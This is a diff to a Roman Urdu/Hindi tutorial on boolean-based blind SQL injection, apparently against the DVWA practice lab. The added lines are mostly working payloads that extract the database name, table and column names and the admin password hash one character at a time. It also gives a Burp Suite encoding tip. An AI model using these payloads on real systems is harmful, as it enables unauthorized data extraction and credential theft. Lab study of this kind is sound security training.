@@ -263,6 +263,8 @@ Kyunki dono conditions True hain, backend app response deti hai: **User ID exist
 
 ### Medium Level Blind SQLi
 
+
+## MOST IMPORTANT RULES:
 Rule: Burp Suite Repeater mein payload daalne ke baad space aur # wali line ko highlight karke Ctrl + U dabayein (auto URL-encode karne ke liye).
 
 **​True Response: User ID exists in the database**
@@ -270,5 +272,46 @@ Rule: Burp Suite Repeater mein payload daalne ke baad space aur # wali line ko h
 ### For Finding Database Length
 
 `id=1 AND LENGTH(database())=4#`
+
+(4, 5, 6 try karein jab tak True response na aaye).
+
+### Database Name Character-by-Character Extract
+
+`id=1 AND SUBSTR(database(), 1, 1)='d'#`
+
+### Finding Table Length 
+
+`id=1 AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=9#`
+
+**9# ki jagah kuch sub numbers try kiye jaa skty hain jabtk response na aye nhi pata chalta length kitni hai**
+
+**(Pehle table ke liye LIMIT 0,1, doosre table ke liye LIMIT 1,1 use karein).**
+
+### First Table Name Character-by-Character Extract
+
+`id=1 AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)='g'#`
+
+### Finding Column Name Length
+
+`id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1))=4#`
+
+**(Pehle column ke liye LIMIT 0,1, doosre column ke liye LIMIT 1,1 use karein).**
+
+### Column Name Character-by-Character Extract
+
+`id=1 AND SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1)='u'#`
+
+### Finding Admin Password Hash Length
+
+`id=1 AND LENGTH((SELECT password FROM users WHERE user='admin'))=32#`
+
+** Note: (MD5 hash ki length hamesha 32 hoti hai iss liye yeh payload itna zaroori nhi hai).**
+
+### Admin Password Hash Character-by-Character Extract
+
+`id=1 AND SUBSTR((SELECT password FROM users WHERE user='admin'), 1, 1)='5'#`
+
+---
+
 
 
